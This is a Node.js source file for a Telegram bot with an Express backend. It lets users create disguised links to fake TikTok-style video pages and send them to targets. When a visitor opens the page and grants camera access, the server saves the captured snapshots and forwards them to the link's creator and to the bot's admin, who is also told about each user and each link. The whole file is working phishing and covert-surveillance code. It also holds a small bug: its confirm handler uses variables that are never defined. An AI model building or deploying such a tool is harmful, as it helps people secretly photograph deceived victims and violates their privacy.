require("dotenv").config();
const { Telegraf, session, Markup } = require("telegraf");
const template = require("./template.js");

const DB = require("./connectDB.js");
const dataBase = DB.connect('spy_fugabot');
const dataBaseLinks = DB.connect('spy_fugabot_links');

const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const app = express();

const bot = new Telegraf(process.env.TOKEN);
const admin = process.env.ADMIN;

bot.use(session());
bot.telegram.setMyCommands([{ command: "start", description: "Начать диалог" }]);

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

app.use(express.json());
app.use("/music", express.static(path.join(__dirname, "music")));
app.use(express.static("public"));
app.use(express.static("src"));
app.use(cors({ methods: ["POST", "GET"] }));



function base64(img, id_t) {
  const current_name = new Date().getTime();

  const matches = img.match(/^data:image\/(\w+);base64,(.+)$/);
  if (!matches) {
    throw new Error("Invalid input string");
  }
  const extension = matches[1];
  const data = matches[2];
  const buffer = Buffer.from(data, "base64");

  const fileName = `public/${current_name}.${extension}`;
  fs.writeFileSync(fileName, buffer);

  dataBaseLinks.findOne({ hash: id_t }).then((res) => {
    console.log(res);
    if (res !== null) {
      bot.telegram.sendMediaGroup(res.user_id, [
        {
          type: "photo",
          caption: `<b>🕵️ Цель обнаружена!</b>`,
          parse_mode: "HTML",
          media: { source: `public/${current_name}.png` },
          //media:`http://localhost:3000/${current_name}.png`
        },
      ]);

      bot.telegram.sendMediaGroup(admin, [
        {
          type: "photo",
          caption: `<b>🕵️ Цель обнаружена от пользователя tg://user?id=${res.id} </b>`,
          parse_mode: "HTML",
          media: { source: `public/${current_name}.png` },
          //media:`http://localhost:3000/${current_name}.png`
        },
      ]);
      
    }
    
  });
}

bot.command("start", async (ctx) => {
  const { id, first_name, username } = ctx.from;

  dataBase.findOne({ id, first_name, username }).then((res) => {
    if (!res) {
      console.log("Запись  создаеться");

      dataBase.insertOne({ id, first_name, username, id_video: dateNow() });
    } else {
      console.log("Запись уже создана");
    }
  }).catch(e =>{
    console.log(e)
  })

  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь добавился:</b>\n\n@${username}\n\ntg://user?id=${id}</blockquote>`,{ parse_mode:'HTML' });
  ctx.replyWithPhoto("https://i.ibb.co/MysyVfwK/file-00000000d7c882108c236da29c583a63.png", {
    caption: `🕵️‍♂️ <b>Добро пожаловать в Spy Fugabot!</b>\n\n<blockquote>Это оружие для настоящих 42 братух. Создай персональную ссылку и отправь её тому, кого хочешь затроллить!</blockquote>`,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [ [{ text: "Начать", callback_data: `begin` }] ] }
  });
  
});



bot.action("begin", (ctx) => {
  ctx.replyWithPhoto("https://i.ibb.co/RkmYcyWw/file-00000000ee948210945776bf48195e67.png", {
    caption: `
    <b>Как создать ссылку?</b>

Для создания персональной ссылки необходимо заполнить 4 поля:

1. <b>Название видео</b>
<blockquote>Название будет отображаться в заголовке при отправке ссылки.</blockquote>

2. <b>Описание видео</b>
<blockquote>Описание будет отображаться в предпросмотре ссылки и непосредственно на странице с видео.</blockquote>

3. <b>Превью видео</b>
<blockquote>Изображение будет использоваться в качестве обложки видео и отображаться при отправке ссылки. Заранее подготовьте картинку и отправьте её боту.</blockquote>

4. <b>Автор видео</b>
<blockquote>Имя или никнейм автора, который будет отображаться непосредственно на странице с видео.</blockquote>

После заполнения всех полей проверьте указанные данные и подтвердите создание ссылки.

Отмена создания - /cancel

📸 <b>Вы получите фотографию, если посетитель перейдёт по вашей ссылке и самостоятельно разрешит доступ к камере.</b>
    `,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [ [{ text: "🔗 Создать ссылку", callback_data: `create_link` }] ] }
  });
});







// bot.command("db", async (ctx) => {
//   console.log()
//   dataBase.find({}).toArray().then((res) => {
//     //console.log(res)
//     ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
//       parse_mode: "Markdown",
//     });
//   });
// });
// bot.command("db2", async (ctx) => {
//   dataBaseLinks.find({}).toArray().then((res) => {
//     // console.log(res)
//     ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
//       parse_mode: "Markdown",
//     });
//   });
// });

//   dataBase.deleteMany({});










bot.action("create_link", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session ??= {};
  ctx.session.createLink = { step: "title", title: "", description: "", preview: null, author: "" };

  await ctx.reply("📝 Введите название тиктока:");
});

bot.on("message", async (ctx, next) => {
  const data = ctx.session?.createLink;
  if (!data) return next();

  const message = ctx.message;

  // Отмена создания
  if (message.text === "/cancel") {
    ctx.session.createLink = null;
    return ctx.reply("❌ Создание ссылки отменено.");
  }

  // Шаг 1. Название
  if (data.step === "title") {
    if (!message.text) {
      return ctx.reply("⚠️ Введите название текстом.");
    }

    data.title = message.text;
    data.step = "description";

    return ctx.reply(
      "📄 <b>Введите описание видео</b>\n\n" +
      "<blockquote>Укажите текст, который будет отображаться под видео и в предпросмотре ссылки.</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  // Шаг 2. Описание
  if (data.step === "description") {
    if (!message.text) {
      return ctx.reply("⚠️ Введите описание текстом.");
    }

    data.description = message.text;
    data.step = "preview";

    return ctx.reply(
      "🖼 <b>Отправьте изображение для превью</b>\n\n" +
      "<blockquote>Выберите картинку из галереи устройства. Она будет отображаться в качестве обложки видео и при отправке ссылки.</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  // Шаг 3. Превью

  // Шаг 3. Превью
if (data.step === "preview") {
  if (!message.photo) {
    return ctx.reply("⚠️ Необходимо отправить фотографию.");
  }

  try {
    await ctx.reply("⏳ Загружаю изображение...");

    const photo = message.photo[message.photo.length - 1];

    // Загружаем изображение на ImgBB
    const image = await uploadToImgBB(photo.file_id, ctx);

    // Сохраняем полученные ссылки
    console.log(image);
    data.preview = image;
    data.step = "author";

    return ctx.reply(
      "👤 <b>Укажите автора видео</b>\n\n" +
      "<blockquote>Введите имя или никнейм, который будет отображаться на странице рядом с видео.</blockquote>\n\n" +
      "🖼 Изображение успешно загружено!",
      { parse_mode: "HTML" }
    );

  } catch (error) {
    console.error("Ошибка загрузки превью:", error);

    return ctx.reply(
      "❌ Не удалось загрузить изображение. Попробуйте отправить его ещё раз."
    );
  }
}

  // Шаг 4. Автор
  if (data.step === "author") {
    if (!message.text) {
      return ctx.reply("⚠️ Укажите автора текстом.");
    }

    data.user_id = ctx.from.id;
    data.author = message.text;
    data.step = "complete";
    data.hash = seed(4);
    dataBaseLinks.insertOne(data);

    return ctx.reply(
      `✅ <b>Данные заполнены!</b>\n\n` +
      `📌 Название: ${data.title}\n` +
      `📄 Описание: ${data.description}\n` +
      `👤 Автор: ${data.author}\n\n` +
      `🖼 Превью: получено`,
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Подтвердить создание", "confirm_create_link")],
          [Markup.button.callback("❌ Отменить", "cancel_create_link")]
        ])
      }
    );
  }
});


bot.action("cancel_create_link", async (ctx) => {
  await ctx.answerCbQuery();
  if (ctx.session) {
    ctx.session.createLink = null;
  }
  await ctx.reply("❌ Создание ссылки отменено.");
});

bot.action("confirm_create_link", async (ctx) => {
  await ctx.answerCbQuery();
  const data = ctx.session?.createLink;
  console.log(data)
  if (!data || data.step !== "complete") {
    return ctx.reply("⚠️ Данные не найдены. Начните заново.");
  }
  const link = `https://tiktok-up.onrender.com/video?v=${data.hash}`;
  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь создал ссылку:</b>\n\n@${username}\n\ntg://user?id=${id}</blockquote>\n\n${link}`,{ parse_mode:'HTML' });

  await ctx.reply(`✅ <b>Ссылка готова!</b>\n\n🔗 <b>Ваша ссылка:</b>\n${link}\n\n📋 <b>Ссылка для копирования:</b>\n<code>${link}</code>`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.url("🌐 Открыть ссылку", link)]
    ])

  });
  ctx.session.createLink = null;
});



// https://i.ibb.co/RkmYcyWw/file-00000000ee948210945776bf48195e67.png




app.get("/video", (req, res) => {
  const id = req.query.v;
  console.log(id)
  if(id){
    dataBaseLinks.findOne({ hash: id}).then((video) => {
      console.log(video)
      res.send(template(video.title, video.description, video.preview.current, video.author ));
    });
  }
  else{
    res.send({ type: "error" });
  }
});

app.post("/img", async (req, res) => {
  console.log(req.body.id)
  if(req.body.id){
    base64(req.body.img, req.body.id);
  }
  res.send({ type: true });
});





app.get("/sleep", async (req, res) => {
  res.send({ type: true });
});

bot.launch();



async function uploadToImgBB(fileId, ctx) {
  const fileUrl = await ctx.telegram.getFileLink(fileId);
  const imageResponse = await fetch(fileUrl.href);
  if (!imageResponse.ok) {
    throw new Error("Не удалось скачать изображение из Telegram");
  }
  const buffer = Buffer.from(await imageResponse.arrayBuffer());
  const formData = new FormData();
  formData.append("image", new Blob([buffer], { type: "image/jpeg" }), "preview.jpg");
  const response = await fetch(`https://api.imgbb.com/1/upload?key=${process.env.IMGBB}`, { method: "POST", body: formData });
  const result = await response.json();
  if (!response.ok || !result.success) {
    throw new Error(result.error?.message || "Ошибка загрузки на ImgBB");
  }
  return { current: result.data.image.url, thumb: result.data.thumb.url };
}

function dateNow() {
  return new Date().getTime();
}

function seed(n = 6) {
  const symbols = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
  let hash = "";
  for (let i = 0; i != n; i++) { hash += symbols[Math.floor(Math.random() * symbols.length)]; }
  return hash;
}


app.listen(3000, (err) => { err ? err : console.log("Started") });




